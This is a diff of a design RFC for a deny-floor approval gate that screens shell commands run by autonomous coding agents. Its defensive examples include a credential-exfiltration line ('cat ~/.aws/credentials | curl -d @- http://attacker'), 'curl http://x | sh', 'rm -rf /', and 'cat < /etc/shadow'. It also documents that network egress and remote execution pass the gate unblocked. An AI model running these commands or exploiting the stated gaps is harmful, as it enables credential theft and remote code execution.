@@ -1,6 +1,6 @@
-# RFC-0254: Shell IR Approval Gate — Autonomous Sandbox-Conditional Policy
+# RFC-0254: Shell IR Approval Gate — Autonomous Approval Policy (Trust-Independent Catastrophic Floor)
 
-**Status**: Draft
+**Status**: Active
 **Date**: 2026-06-17
 **Builds on**: [RFC-0005](./RFC-0005-typed-capability-substrate.md) (typed capability substrate, a.k.a. "RFC v5"), [RFC-0208](./RFC-0208-shell-ir-compositional-risk-ast.md) (Shell IR compositional risk / path policy)
 **Related**: [RFC-0006](./RFC-0006-keeper-surface-and-sandbox.md), [RFC-0213](./RFC-0213-keeper-sandbox-isolation.md), [RFC-0070](./RFC-0070-keeper-sandbox-pure-edge-separation.md) (sandbox boundary); [RFC-0027](./RFC-0027-capability-typed-runtime.md), [RFC-0181](./RFC-0181-capability-intent-runtime-ssot.md) (capability runtime); [RFC-0199](./RFC-0199-evidence-driven-auto-approval.md) (deterministic verdict source replaces human bottleneck — same philosophy, different domain); [RFC-0088](./RFC-0088-counter-as-fix-result-propagation.md), [RFC-0042](./RFC-0042-keeper-terminal-code-closed-sum.md) (no-string-classifier lineage)
@@ -11,12 +11,9 @@
 
 PR #21338 wires `Keeper_tool_execute_shell_ir.dispatch_classified_with_approval` behind `MASC_SHELL_IR_APPROVAL_GATE_ENABLED`, routing keeper Execute calls through `Approval_policy.decide` with `Approval_config.permissive_default`. As wired, enabling the flag converts every audited/privileged command (`git`, `dune`, `npm`, `python`, `rm`, …) into a terminal error returned to the model, because the `Ask` verdict has no resolver in the autonomous keeper lane. The gate blocks the keeper's entire toolchain while the genuinely catastrophic class (force-push) is coupled to a loosenable trust knob.
 
-This RFC defines the correct model: a **sandbox-conditional** gate where
+This RFC defines the correct model: a **trust-independent catastrophic floor** with a **sandbox-agnostic autonomous overlay**.  The autonomous keeper lane collapses verdicts to `Allow` (+telemetry) or `Deny` (the catastrophic floor). There is no `Ask` in the autonomous lane, because there is no human in the keeper's loop.  The same floor is applied identically to the `Local`/`Host` and `Docker` profiles: Docker containment is the first line of defense, but the catastrophic floor is kept as defense-in-depth because a destructive `git push --force` reaches the real remote even from inside a container.
 
-- **Docker profile** → the container is the security boundary; per-command gating is skipped (container-trust).
-- **Local/Host profile** → an **autonomous policy**: verdicts collapse to `Allow` (+telemetry) or `Deny` (a trust-independent catastrophic floor). There is no `Ask` in the autonomous lane, because there is no human in the keeper's loop.
-
-It also specifies the supporting change that makes the catastrophic floor expressible without string matching: extending `Capability_check.of_ir` to emit typed `Path_scope` for the arguments of filesystem-mutating programs.
+The supporting change that makes the floor expressible without string matching — extending `Capability_check.of_ir` to emit typed `Path_scope` for the arguments of filesystem-mutating programs — was evaluated and dropped: `Exec_policy.validate_shell_ir_paths` already jails path-bearing destructive programs downstream, so a parallel walker in the approval layer would be duplicate classification (see §5.4).
 
 ## 2. Context & problem
 
@@ -62,16 +59,16 @@ Sources: `~/me/workspace/yousleepwhen/claude-code/src/types/permissions.ts` (lea
 
 ## 5. Design
 
-### 5.1 Sandbox-conditional application
+### 5.1 Sandbox-agnostic application
 
-The gate is applied as a function of `sandbox_profile`, decided in `keeper_tool_execute_runtime.ml` before dispatch:
+The gate is wired in `keeper_tool_execute_runtime.ml` before dispatch.  The implementation uses the **same autonomous overlay for both `Local`/`Host` and `Docker` profiles**: the floor is trust-independent and lightweight, so it is kept as defense-in-depth rather than skipped inside a container.  Docker containment is the primary boundary (RFC-0213), but a destructive `git push --force` still reaches the real remote from inside a container, which the floor denies.
 
 | profile | boundary | behavior |
 |---|---|---|
-| `Docker` | container | container-trust: do **not** apply the approval gate; rely on container isolation (RFC-0213) + existing `validate_paths`. Telemetry only. |
+| `Docker` | container | apply the autonomous floor + telemetry; container isolation is the primary boundary. |
 | `Local` / `Host` | path-jail only | apply the **autonomous policy** (§5.2). |
 
-This mirrors Hermes' container exception and removes the redundant fourth layer for the Docker case.
+This is a deliberate departure from the original "sandbox-conditional" wording in the PR title: the catastrophic floor is not conditional on being inside a sandbox.
 
 ### 5.2 Verdict collapse for the autonomous lane
 
@@ -94,7 +91,10 @@ let catastrophic_floor (caps : Capability.t list) : Verdict.deny_reason option =
   | None ->
     match find_write_escape caps with        (* redirect write targets outside the workspace *)
     | Some ps -> Some (Path_escape ps)
-    | None -> find_catastrophic_program caps  (* mkfs, by binary identity (Exec_program.known) *)
+    | None ->
+      match find_read_escape caps with       (* redirect read sources outside the workspace *)
+      | Some ps -> Some (Path_escape ps)
+      | None -> find_catastrophic_program caps  (* mkfs, by binary identity (Exec_program.known) *)
 
 let decide policy ~overlay ~caps ~simple : Verdict.t =
   match catastrophic_floor caps with
@@ -133,11 +133,12 @@ let decide policy ~overlay ~caps ~simple : Verdict.t =
 > the `validate_paths` string heuristic with typed `Path_scope` capabilities is
 > a legitimate but larger, separate effort (its own RFC), not bundled here.
 
-The approval floor is therefore expressed over **three typed members**, all
+The approval floor is therefore expressed over **four typed members**, all
 already available — no `Capability_check` change:
 
 - `Destructive_git of Git_op.t` — `Git_op.Destructive` (force-push, `reset --hard`, `clean -fd[x]`, `branch -D`, `push --delete`); classified by `Git_op.of_argv`, not string match. **Not covered by `validate_paths`** (force-push has no path argument), so the floor is the only enforcer — this is the genuine, non-redundant fix.
 - `Path_escape` from a write **redirect** outside the workspace (`find_write_escape`, existing).
+- `Path_escape` from a read **redirect** outside the workspace (`find_read_escape`, added to remove the read/write floor asymmetry).
 - `Catastrophic_program of Exec_program.t` — a binary that is catastrophic by identity regardless of arguments (currently `mkfs`, matched via `Exec_program.known bin = Some Mkfs`, binary identity, typed). New `Verdict.deny_reason` constructor.
 
 Path-bearing destructive programs (`rm`, `dd`, `chmod`, `chown`, `mv`) are **deliberately not in the approval floor**: their danger is a function of the *target path*, which `validate_shell_ir_paths` already jails to the workspace downstream of the gate. At the approval-policy layer they are graded in stage 2 (e.g. `rm` is `Privileged`; under the autonomous overlay → `Allow`), and `validate_paths` then denies an out-of-workspace target. `test_rm_root_allowed_at_policy_layer_jailed_downstream` pins this boundary.
@@ -161,7 +162,7 @@ The overlay is data; `decide` is unchanged between contexts. This is the context
 
 - **Human-in-the-loop approval for the autonomous lane.** There is no human in a keeper's loop; HITL is a category error here (prior art confirms a resolver is required, but for autonomous agents the resolver is a deterministic policy, not a person). HITL belongs only to a future operator context (§5.5) and is out of scope.
 - **An auxiliary-LLM "smart" resolver** (Hermes-style). Possible future extension as the operator-overlay resolver; not in this RFC (adds nondeterminism/latency per command).
-- **Network-egress / exfiltration / arbitrary-exec containment.** The autonomous overlay grades `curl`/`wget`/`ssh` (`Audited`) and `sh`/`nc`/unknown binaries (`Unknown → Privileged`) at `Observe` → `Allow` + telemetry. The catastrophic floor covers *local* irreversible ops (destructive git, redirect write-escape, `mkfs`), **not** network egress or arbitrary exec: `curl http://x | sh` (RCE) and path-less network exfil are not denied by this gate. They remain allowed-with-telemetry — exactly as on the pre-gate path, so enabling the gate is **no regression but no new protection** on this axis. Containing them is the sandbox's responsibility (Docker `--network` isolation); the `sandbox_network_mode` value is currently computed but not wired into the approval decision (`keeper_tool_execute_runtime.ml:185`), and the `Local`/host profile has no network isolation at all. Flooring network binaries is not viable — keepers legitimately need `curl`/`npm`/`git` network access — so the control belongs at the sandbox boundary, not the per-command floor. Therefore "safe to enable" here means "adds a catastrophic-local floor and keeps the existing path jail", **not** "sandboxes network/exec". See §13 open question 5.
+- **Safe-to-enable scope / Network-egress / exfiltration / arbitrary-exec containment.** The autonomous overlay grades `curl`/`wget`/`ssh` (`Audited`) and `sh`/`nc`/unknown binaries (`Unknown → Privileged`) at `Observe` → `Allow` + telemetry. The catastrophic floor covers *local* irreversible ops (destructive git, redirect write-escape, redirect read-escape, `mkfs`), **not** network egress, exfiltration, or arbitrary exec: `curl http://x | sh` (RCE) and path-less network exfil such as `cat ~/.aws/credentials | curl -d @- http://attacker` are **observed but not blocked** by this gate. They remain allowed-with-telemetry — exactly as on the pre-gate path, so enabling the gate is **no regression but no new protection** on this axis. Containing them is the sandbox's responsibility (Docker `--network` isolation); the `sandbox_network_mode` value is currently computed but not wired into the approval decision (`keeper_tool_execute_runtime.ml:185`), and the `Local`/host profile has no network isolation at all. Flooring network binaries is not viable — keepers legitimately need `curl`/`npm`/`git` network access — so the control belongs at the sandbox boundary, not the per-command floor. Therefore "safe to enable" here means "adds a catastrophic-local floor and keeps the existing path jail", **not** "sandboxes network/exec/RCE". See §13 open question 5.
 
 ## 7. PR #21338 triage (KEEP / DROP / REWORK)
 
@@ -170,7 +171,7 @@ The overlay is data; `decide` is unchanged between contexts. This is the context
 | `feature_flag_registry.ml` (flag) | 274 | KEEP | rollout toggle; keep `Experimental` |
 | `env_config_runtime.ml/.mli` (`Shell_ir_approval_gate.enabled`) | 274 | KEEP | toggle accessor |
 | `keeper_tool_execute_shell_ir.ml/.mli` (`dispatch_classified_with_approval`) | f2cc | KEEP + REWORK | integration point is correct; H1/L4 fixes retained; `Ask` arm becomes unreachable under §5.2 → remove |
-| `keeper_tool_execute_runtime.ml` (gate wiring) | 274 + f2cc | REWORK | replace inline `permissive_default`/`per_agent=[]` with §5.1 sandbox branch + §5.5 contextual overlay; drop `Ask`/`Approval_required` arm |
+| `keeper_tool_execute_runtime.ml` (gate wiring) | 274 + f2cc | REWORK | replace inline `permissive_default`/`per_agent=[]` with §5.1 sandbox-agnostic autonomous overlay + §5.5 contextual overlay; drop `Ask`/`Approval_required` arm |
 | `keeper_workspace_read_ops.ml` (error arms) | f2cc | REWORK | reads are not `Ask`-blocked under §5.2; floor only |
 | `shell_command_gate.ml` + `dune` (`log_verdict`) | f2cc | RELOCATE | move telemetry to the approval boundary; log allows (§5.6) |
 | `exec_dispatch.ml/.mli` (`dispatch_async`, `dispatch_decided_outcome`, `argv_of_ir`, `dispatch_outcome`) | f2cc | DROP | no production callers; unrelated to the gate |
@@ -178,7 +179,7 @@ The overlay is data; `decide` is unchanged between contexts. This is the context
 | `test_exec_dispatch.ml` | 274 | SPLIT | keep `dispatch_classified_with_approval` tests (rework for §5.2 verdicts); drop async/outcome tests |
 | `test_tool_dispatch.ml` (`dispatch_many` tests) | 274 | DROP | with the dead function |
 
-**Not in the PR, added by this RFC:** the `decide` reshape (§5.3), the `catastrophic_floor` + `find_catastrophic_program` + `Verdict.Catastrophic_program` (§5.4), the `Approval_config.autonomous` overlay (§5.5), and the sandbox branch (§5.1). The PR delivers wiring; this RFC supplies the policy the wiring should carry. (The originally-planned `Capability_check` argv-path-scope extension is dropped — §5.4 premise correction.)
+**Not in the PR, added by this RFC:** the `decide` reshape (§5.3), the `catastrophic_floor` + `find_catastrophic_program` + `find_read_escape` + `Verdict.Catastrophic_program` (§5.4), the `Approval_config.autonomous` overlay (§5.5), and the sandbox-agnostic wiring (§5.1). The PR delivers wiring; this RFC supplies the policy the wiring should carry. (The originally-planned `Capability_check` argv-path-scope extension is dropped — §5.4 premise correction.)
 
 > Already landed on the PR branch (`e6275dfbfe`): typed `Verdict.deny_reason_to_string` (H1), nested-pipeline `Too_complex` alignment (L4), doc-ordering fix (M1), deterministic `rm` test (L3). All remain valid; M3 (`Ask` informative summary) becomes moot once `Ask` is removed from the autonomous lane.
 >
@@ -189,7 +190,7 @@ The overlay is data; `decide` is unchanged between contexts. This is the context
 P0 (typed argv path-scope) is **dropped** — see the §5.4 premise correction.
 
 1. **P1 — `decide` reshape + `catastrophic_floor` (§5.3–5.4). ✅ done (`approval_policy.ml`, this branch).** Destructive-git moved out of the trust branch into an unconditional floor; added `find_catastrophic_program` (mkfs) and the typed `Verdict.Catastrophic_program` reason; added the `Approval_config.autonomous` overlay. Tests (`lib/exec/test/test_approval_policy.ml`): the floor Denies `git push --force` under every overlay incl. autonomous; `mkfs` Denied under autonomous; `rm -rf /` Allowed at the policy layer (jailed downstream by `validate_paths`); `git status` Allowed under autonomous. Full `lib/exec` suite green (`DUNE_CACHE=disabled dune build --root . @lib/exec/test/runtest`).
-2. **P2 — autonomous overlay wiring + sandbox branch (§5.1, 5.5).** In `keeper_tool_execute_runtime.ml`: select `Approval_config.autonomous` for the keeper lane (replace the inline `permissive_default`/`per_agent = []`); `Docker → skip the gate`, `Local → autonomous`. Remove the `Ask`/`Approval_required` arm. (lib/keeper — CI-verified; local full build blocked by the agent_sdk pin drift.)
+2. **P2 — autonomous overlay wiring (§5.1, 5.5).** In `keeper_tool_execute_runtime.ml`: select `Approval_config.autonomous` for the keeper lane (replace the inline `permissive_default`/`per_agent = []`); apply the same overlay for both `Local` and `Docker` profiles. Remove the `Ask`/`Approval_required` arm. (lib/keeper — CI-verified; local full build blocked by the agent_sdk pin drift.)
 3. **P3 — telemetry relocation (§5.6).** Remove `log_verdict` from shared `gate_typed`; log at the approval boundary incl. allows.
 4. **P4 — drop dead code (§7).** Remove `dispatch_async`/`dispatch_decided_outcome`/`argv_of_ir`/`dispatch_many` + tests.
 5. **P5 — verification (§9).**
@@ -198,7 +199,7 @@ P0 (typed argv path-scope) is **dropped** — see the §5.4 premise correction.
 
 - **TLA+ bug-model** (per the repo's spec-mutation pattern): model the policy as a state machine; `BugAction` = a catastrophic command reaching `Allow`; `SafetyInvariant` `CatastrophicNeverAllowed`. Clean spec: no error. `-buggy.cfg`: invariant violated. Both `.cfg`s must pass their respective expectations.
 - **Property:** for all overlays (autonomous, operator, enforced_all), a catastrophic-floor input is `Deny`. Loosening any trust level never produces `Allow` for a floor input.
-- **Behavior tests:** `git status`/`dune build`/`pytest` under autonomous overlay → `Allow`; `git push --force` → `Deny`; `rm -rf /` → `Deny`; `rm ./build` → `Allow`; Docker profile → gate skipped.
+- **Behavior tests:** `git status`/`dune build`/`pytest` under autonomous overlay → `Allow`; `git push --force` → `Deny`; `rm -rf /` → `Deny`; `rm ./build` → `Allow`; `cat < /etc/shadow` → `Deny`; Docker profile → same autonomous floor applied (defense-in-depth, not skipped).
 - **Build:** `lib/exec`, `lib/keeper_tooling`, `lib/keeper` via `scripts/dune-local.sh` (pin-correct env); full `test/test_exec_dispatch.exe` in CI.
 - **Non-fatal preservation:** confirm a floor `Deny` returns error JSON (lane keeps turning), never raises.
 
@@ -214,14 +215,14 @@ P0 (typed argv path-scope) is **dropped** — see the §5.4 premise correction.
 
 | Option | Description | Why not (primary) |
 |---|---|---|
-| **0. Delete the gate** | Rely on sandbox containment only | Correct only for Docker; Host has no container boundary. Adopted *for Docker* in §5.1. |
+| **0. Delete the gate** | Rely on sandbox containment only | Correct only for Docker; Host has no container boundary. Docker containment remains the primary boundary, but the catastrophic floor is kept as defense-in-depth. |
 | **B. Observability-only** | Allow all, log, never Deny | Telemetry-as-fix (RFC-0088 anti-pattern); no protection against force-push. |
 | **C. LLM "smart" resolver** | Auxiliary LLM resolves `Ask` | Nondeterminism + latency/cost per command for a keeper that runs many. Possible future operator-overlay resolver, not the autonomous default. |
 | **D. Capability budget / cooldown** | Allow with rate caps | cap/cooldown symptom-suppression (CLAUDE.md workaround bar); does not classify danger. |
 | **E. Escalate containment per-command** | Risky commands → throwaway sandbox | Heavy infra; some ops (push, network) need real creds/network and cannot be fully sandboxed. |
 | **F. Typed sub-tools** | Replace raw shell with `GitCommit`/`GitPush-safe` typed tools | Largest redesign; loses generality of shell. Long-term direction, not this RFC. |
 
-The chosen design = **Option 0 for Docker + the autonomous floor model for Host**, which is the minimal change satisfying: lane keeps running, keeper can work, no double-gating, no HITL, and catastrophic protection strengthened (decoupled from trust).
+The chosen design = **the autonomous floor model applied sandbox-agnostically**, which is the minimal change satisfying: lane keeps running, keeper can work, no double-gating, no HITL, and catastrophic protection strengthened (decoupled from trust).
 
 ## 12. Workaround-rejection alignment
 
@@ -229,11 +230,11 @@ This RFC **removes** a workaround-shaped construct (`Ask`-dangling: a verdict th
 
 ## 13. Open questions
 
-1. Should `sudo`/`su` join the `Catastrophic_program` floor (§5.4) as defense-in-depth? They are typed (`Exec_program.known`) and never legitimate for a keeper, but under the autonomous overlay they are currently graded `Privileged → Allow`. P1 left the floor at destructive-git + redirect-escape + `mkfs` per the chosen scope (Option A).
-2. Should the `Docker` profile still apply the catastrophic floor as defense-in-depth, or fully trust the container? (Hermes fully skips; defense-in-depth would keep the floor.) — decides P2.
+1. Should `sudo`/`su` join the `Catastrophic_program` floor (§5.4) as defense-in-depth? They are typed (`Exec_program.known`) and never legitimate for a keeper, but under the autonomous overlay they are currently graded `Privileged → Allow`. P1 left the floor at destructive-git + redirect write/read escape + `mkfs` per the chosen scope (Option A).
+2. **Decided for this RFC:** the `Docker` profile keeps the catastrophic floor as defense-in-depth rather than skipping it. (Hermes fully skips; defense-in-depth keeps the floor.) The implementation applies `Approval_config.autonomous` identically to `Local` and `Docker` profiles.
 3. Operator-overlay resolver (§5.5) — separate RFC; what UI/protocol resolves `Ask`?
 4. Should the `validate_paths` `looks_like_path_token` + `command_materializes_path_arg` string/heuristic layer be replaced with typed `Path_scope` capabilities (a deferred "typed-replacement" RFC)? That is the honest home for the work the dropped P0 was reaching toward — at the validation layer, not a parallel walker in `capability_check`.
-5. **Network/exec containment (§6 non-goal).** Should `sandbox_network_mode` be wired into dispatch (Docker `--network` enforcement) and/or should the autonomous lane treat path-less network egress + arbitrary exec (`curl http://x | sh`, `nc`) as a floor for the `Local`/host profile (which has no container)? A blanket network-binary floor breaks legitimate keeper use (`curl`/`npm`/`git`), so the control likely belongs at the sandbox boundary — separate RFC. Until then the gate's protection is explicitly catastrophic-local + path-jail only, and read-escape is asymmetric with write-escape (write is floored, read is only `validate_paths`, which passes everything when `workdir=None`).
+5. **Network/exec containment (§6 non-goal).** Should `sandbox_network_mode` be wired into dispatch (Docker `--network` enforcement) and/or should the autonomous lane treat path-less network egress + arbitrary exec (`curl http://x | sh`, `nc`) as a floor for the `Local`/host profile (which has no container)? A blanket network-binary floor breaks legitimate keeper use (`curl`/`npm`/`git`), so the control likely belongs at the sandbox boundary — separate RFC. Until then the gate's protection is explicitly catastrophic-local + path-jail only; read-escape and write-escape are both floored, but network/exfil/RCE remain observed, not blocked.
 
 ## 14. References
 
